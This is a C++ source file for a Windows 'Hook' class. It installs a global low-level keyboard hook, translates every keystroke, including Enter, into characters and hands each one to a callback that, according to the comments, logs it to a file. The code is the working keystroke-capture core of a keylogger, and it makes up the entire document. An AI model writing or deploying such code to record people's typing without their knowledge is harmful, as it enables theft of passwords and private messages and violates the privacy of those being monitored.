#include "stdafx.h"
#include "Hook.h"

using namespace std;

std::function<void(wchar_t[])> Hook::callback;

void Hook::SetHook(std::function<void(wchar_t[])> keyboardCallback) {
	callback = keyboardCallback;
	std::cout << "set hook";
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, NULL, 0);
}

LRESULT CALLBACK Hook::hookProc(const int nCode, const WPARAM wParam, const LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	BYTE keyState[256] = { 0 };
	bool keyStateResult;
	wchar_t buffer[5];

	/*
	* See here for why this seemingly useless call is required:
	* http://www.siao2.com/2006/12/20/1332470.aspx
	*/
	GetKeyState(NULL);

	/*
	* GetKeyboardState: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646299(v=vs.85).aspx
	*/
	keyStateResult = GetKeyboardState(keyState);

	switch (wParam) {
	case WM_KEYDOWN:
	{
		/*
		*  Converts the virtual key code and keystate to unicode character.
		*  Virtual Key Codes: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
		*  toUnicodeEx: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646320(v=vs.85).aspx
		*/
		int toUnicodeResult = ToUnicodeEx(
			p->vkCode,
			p->scanCode,
			keyState,
			buffer,
			_countof(buffer),
			0,
			NULL
		);

		if (p->vkCode == VK_RETURN) {
			/*
			* Was the enter key pressed? If so, insert a new line character
			* into the log file.
			*/
			callback(L"\n");
		} else {
			/*
			* Log everything else to file. It's important to note that certain keys
			* will produce odd characters (such as backspace). We could handle these
			* but in this instance it's not required.
			*/
			callback(buffer);
		}
	}

	break;
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}